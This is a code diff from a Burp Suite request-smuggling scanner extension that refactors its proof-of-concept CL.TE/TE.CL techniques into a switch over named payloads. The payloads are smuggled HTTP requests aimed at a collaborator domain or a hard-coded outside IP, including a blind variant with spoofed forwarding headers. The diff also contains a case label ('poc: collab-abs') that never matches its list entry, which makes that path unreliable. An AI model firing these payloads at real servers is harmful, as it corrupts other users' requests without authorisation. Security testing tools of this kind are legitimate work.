@@ -5,9 +5,7 @@ import org.apache.commons.lang3.tuple.Pair;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
-import java.util.HashMap;
-import java.util.HashSet;
-import java.util.LinkedHashSet;
+import java.util.*;
 
 public class ChunkContentScan extends SmuggleScanBox implements IScannerCheck  {
 
@@ -124,73 +122,77 @@ public class ChunkContentScan extends SmuggleScanBox implements IScannerCheck  {
         return false;
     }
 
+    static List<String> pocTechniques = Arrays.asList("G", "headerConcat", "bodyConcat", "collab", "collab-header", "collab-XFO-header", "collab-abs", "collab-at", "collab-blind");
     static boolean tryPocs(byte[] base, IHttpService service, boolean CLTE, HashMap<String, Boolean> config) {
 
         HashSet<Boolean> results = new LinkedHashSet<>();
-        if (Utilities.globalSettings.getBoolean("poc: G")) {
-            results.add(prepPoc(base, service, CLTE, "G", "G", config));
-        }
-        //boolean cpoc = sendPoc(base, service,"GET / HTTP/1.1\r\nHost: "+service.getHost()+".z88m811soo7x6fxuo08vu4wd94fw3l.burpcollaborator.net\r\n\r\n");
-        //boolean cpoc = sendPoc(base, service, "collab", "GET /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\n\r\n");
         String collabWithHost = service.getHost() + "."  + Utilities.globalSettings.getString("collab-domain");
+        for (String technique: pocTechniques) {
 
-        if (Utilities.globalSettings.getBoolean("poc: headerConcat")) {
-            results.add(prepPoc(base, service, CLTE, "headerConcat",
-                      "GET /?x=5u0ddwptlhzwzk0kkdjae3bt9kfc31/"+service.getHost()+" HTTP/1.1\r\n" +
+            if (!Utilities.globalSettings.getBoolean("poc: "+technique)) {
+                continue;
+            }
+
+            String inject;
+            switch (technique) {
+                case "G":
+                    inject = "G";
+                    break;
+                case "headerConcat":
+                    inject = "GET /?x=5u0ddwptlhzwzk0kkdjae3bt9kfc31/"+service.getHost()+" HTTP/1.1\r\n" +
                             "Host: 52.16.21.24\r\n" +
-                            "Foo: x", config));
-        }
-        if (Utilities.globalSettings.getBoolean("poc: bodyConcat")) {
-            results.add(prepPoc(base, service, CLTE, "bodyConcat",
-                      "POST /?x=5u0ddwptlhzwzk0kkdjae3bt9kfc31/"+service.getHost()+" HTTP/1.1\r\n" +
+                            "Foo: x";
+                    break;
+                case "bodyConcat":
+                    inject = "POST /?x=5u0ddwptlhzwzk0kkdjae3bt9kfc31/"+service.getHost()+" HTTP/1.1\r\n" +
                             "Host: 52.16.21.24\r\n" +
                             "Content-Type: application/x-www-form-urlencoded\r\n" +
                             "Content-Length: 8\r\n\r\n" +
-                            "foo=", config));
-        }
-        if (Utilities.globalSettings.getBoolean("poc: collab")) {
-            results.add(prepPoc(base, service, CLTE,"collab",
-                      "GET / HTTP/1.1\r\n" +
-                            "Host: "+collabWithHost+"\r\n\r\n", config));
-        }
-        if (Utilities.globalSettings.getBoolean("poc: collab-header")) {
-            results.add(prepPoc(base, service, CLTE,"collab-header",
-                      "GET / HTTP/1.1\r\n" +
+                            "foo=";
+                    break;
+                case "collab":
+                    inject = "GET / HTTP/1.1\r\n" +
+                            "Host: "+collabWithHost+"\r\n\r\n";
+                    break;
+                case "collab-header":
+                    inject = "GET / HTTP/1.1\r\n" +
                             "Host: "+collabWithHost+"\r\n" +
-                            "X-Foo: X", config));
+                            "X-Foo: X";
+                    break;
+                case "collab-XFO-header":
+                    inject = "GET / HTTP/1.1\r\n" +
+                            "X-Forwarded-Host: "+collabWithHost+"\r\n" +
+                            "X-Foo: X";
+                    break;
+                case "poc: collab-abs":
+                    inject = "GET http://"+collabWithHost+"/ HTTP/1.1\r\n" +
+                "X-Foo: X";
+                    break;
+                case "collab-at":
+                    inject = "GET @"+collabWithHost+"/ HTTP/1.1\r\n" +
+                            "X-Foo: X";
+                    break;
+
+                case "collab-blind":
+                    inject = String.format(
+                            "GET / HTTP/1.1\r\n" +
+                                    "Host: %s\r\n" +
+                                    "Referer: http://ref.%s/\r\n" +
+                                    "X-Forwarded-For: xff.%s\r\n" +
+                                    "True-Client-IP: tci.%s\r\n" +
+                                    "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0\r\n" +
+                                    "Accept-Encoding: gzip, deflate\r\n" +
+                                    "Accept: */*\r\n" +
+                                    "Accept-Language: en\r\n" +
+                                    "connection: close\r\n\r\n", service.getHost(), collabWithHost, collabWithHost, collabWithHost);
+                    break;
+                default:
+                    throw new RuntimeException("Invalid poc type");
+
+            }
+            results.add(launchPoc(base, technique, CLTE, inject, service, config));
         }
-        if (Utilities.globalSettings.getBoolean("poc: collab-XFO-header")) {
-            results.add(prepPoc(base, service, CLTE,"collab-xfo-header",
-                    "GET / HTTP/1.1\r\n" +
-                    "X-Forwarded-Host: "+collabWithHost+"\r\n" +
-                    "X-Foo: X", config));
-        }
-        if (Utilities.globalSettings.getBoolean("poc: collab-abs")) {
-            results.add(prepPoc(base, service, CLTE,"collab-abs",
-                      "GET http://"+collabWithHost+"/ HTTP/1.1\r\n" +
-                            "X-Foo: X", config));
-        }
-        if (Utilities.globalSettings.getBoolean("poc: collab-at")) {
-            results.add(prepPoc(base, service, CLTE,
-                      "collab-at",
-                      "GET @"+collabWithHost+"/ HTTP/1.1\r\n" +
-                            "X-Foo: X", config));
-        }
-        if (Utilities.globalSettings.getBoolean("poc: collab-blind")) {
-            String req = String.format(
-                    "GET / HTTP/1.1\r\n" +
-                    "Host: %s\r\n" +
-                    "Referer: http://ref.%s/\r\n" +
-                    "X-Forwarded-For: xff.%s\r\n" +
-                    "True-Client-IP: tci.%s\r\n" +
-                    "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0\r\n" +
-                    "Accept-Encoding: gzip, deflate\r\n" +
-                    "Accept: */*\r\n" +
-                    "Accept-Language: en\r\n" +
-                    "connection: close\r\n\r\n", service.getHost(), collabWithHost, collabWithHost, collabWithHost);
-            // 'Connection: close' gets changed to keep-alive which breaks the offset
-            results.add(prepPoc(base, service, CLTE,"collab-blind", req, config));
-        }
+
         return results.contains(Boolean.TRUE);
     }
 
@@ -220,22 +222,6 @@ public class ChunkContentScan extends SmuggleScanBox implements IScannerCheck  {
             return null;
         }
     }
-
-
-    static boolean prepPoc(byte[] base, IHttpService service, boolean CLTE, String name, String inject, HashMap<String, Boolean> config) {
-        String setupAttack;
-        int pauseAfter;
-        Pair<String, Integer> attack;
-        if (CLTE ) {
-            attack = getCLTEAttack(base, inject, config);
-        } else {
-            attack = getTECLAttack(base, inject, config);
-        }
-        byte[] victim = makeChunked(base, 0, 0, config, false);
-        return launchPoc(name, attack, victim, service, new HashMap<>());
-    }
-
-
 
     static byte[] bypassContentLengthFix(byte[] req) {
         return Utilities.replace(req, "Content-Length: ".getBytes(), "Content-length: ".getBytes());
